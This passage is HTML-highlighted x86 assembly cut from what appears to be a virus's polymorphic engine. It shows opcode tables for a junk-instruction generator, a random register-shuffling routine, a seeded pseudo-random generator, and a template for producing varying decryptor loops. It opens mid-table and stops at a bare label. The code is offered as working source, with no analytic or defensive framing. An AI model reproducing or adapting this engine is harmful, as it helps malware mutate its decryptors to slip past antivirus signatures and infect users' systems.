</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; AND               - +3       = 16bit reg  -&gt; 16bit addr</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">028h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; SUB</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; XOR</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">038h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; CMP</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">088h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; MOV</span><span class="sc0">
</span><span class="sc5">Table1_len</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table1</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">Table2</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; TEST              - unchanged = 8bit  -&gt; 8bit</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">086h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; XCHG                +1        = 16bit -&gt; 16bit</span><span class="sc0">
</span><span class="sc5">Table2_len</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table2</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">Table3</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; INC               +reg number = INC reg</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; DEC               +reg number = DEC reg</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; PUSH              +reg number = PUSH reg</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">058h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; POP               +reg number = POP reg</span><span class="sc0">
</span><span class="sc5">Table3_len</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table3</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">Table4</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Conditonal Jump   +0 .. +0Fh  = jump condition</span><span class="sc0">
</span><span class="sc5">Table4_len</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table4</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">Table5</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Mov immediate to 8bit reg      +reg number = mov to reg</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Mov immediate to 16/32bit reg  +reg number = mov to reg</span><span class="sc0">
</span><span class="sc5">Table5_len</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table5</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">Table6</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Long conditional jmp</span><span class="sc0">
</span><span class="sc5">Table6_len</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table6</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">Table7</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">
   </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Table7_len</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table7</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">Tables</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                            </span><span class="sc1">; this is useless in this</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table1</span><span class="sc0">                 </span><span class="sc1">; version</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table2</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table3</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table4</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table5</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table6</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Table7</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Table_numbers</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Tables</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">     </span><span class="sc1">; this is useful...</span><span class="sc0">

</span><span class="sc5">address_save</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">junk_finish</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">flawable</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">we_create_jcond</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">first_intend</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;                  ²±°                                ²</span><span class="sc0">
</span><span class="sc1">;                  ²±    Junk Generator Module End   ±²</span><span class="sc0">
</span><span class="sc1">;                  ²                                °±²</span><span class="sc0">

</span><span class="sc1">;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ</span><span class="sc0">



</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Here we have the place where the engine chooses the random stuff.         Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">

</span><span class="sc5">Choose_random_registers</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0"> </span><span class="sc10">Near</span><span class="sc0">         </span><span class="sc1">; Here we choose the random regs</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_registers</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; point to registers</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_registers</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; point to registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                      </span><span class="sc1">; save position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">                      </span><span class="sc1">; scramble 50h times</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mangle</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                    </span><span class="sc1">; choose a random nr. between 0-6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; in EBX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                    </span><span class="sc1">; choose a random nr. between 0-6</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; in EAX</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">mangle</span><span class="sc0">                         </span><span class="sc1">; if EAX=EBX choose again</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; increment first pointer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                      </span><span class="sc1">; increment second pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; and exchange the values</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; between them</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                      </span><span class="sc1">; restore position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">mangle</span><span class="sc0">                       </span><span class="sc1">; and do it 50h times</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Retn</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Choose_random_registers</span><span class="sc0"> </span><span class="sc9">Endp</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">randomize</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; this randomize procedure must</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; be called first when the word</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seed</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; on the stack is smth. like</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; 0BF87.... and it is different</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">; for each loaded file depending</span><span class="sc0">
</span><span class="sc5">randomize</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                            </span><span class="sc1">; on different thingies. The</span><span class="sc0">
                                          </span><span class="sc1">; seed gets incremented anyway</span><span class="sc0">
</span><span class="sc5">random32</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                        </span><span class="sc1">; from generation to generation.</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seed</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">33</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">rloop</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">197</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">rloop</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seed</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">random32</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">seed</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0BFF81234h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">brandom32</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                           </span><span class="sc1">; this procedure expects a value</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">; in EAX and returns a random</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; number in EAX but smaller than</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random32</span><span class="sc0">                      </span><span class="sc1">; EAX's original value. Actually</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">; it bounds EAX (0&lt;=EAX&lt;=limit-1)</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">; EDX and ECX are preserved</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">brandom32</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">


</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Here we have the data on the decryptor generation.                        Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">

</span><span class="sc5">decryptor</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">i01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; mov preg, code_start</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">i02</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; mov kreg, key</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">i03</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; mov lreg, code_length/8</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">i04</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; mov creg, [preg] (mainloop)</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">i05</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; &lt;op1&gt; creg, kreg</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">i06</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">                 </span><span class="sc1">; &lt;op2&gt; creg, key2</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">i07</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; &lt;op3&gt; creg, [preg+4]</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">i08</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; mov [preg], creg</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">i09</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">          </span><span class="sc1">; &lt;op4&gt; kreg, keyvalue</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">i10</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">; sub preg, 4</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">i11</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; sub lreg, 1</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">i12</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;jnz 0                      ; jnz mainloop</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">85h</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Here we have the engine's general data.                                   Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">

</span><span class="sc5">un_op_code1</span><span class="sc4">:</span><span class="sc0">
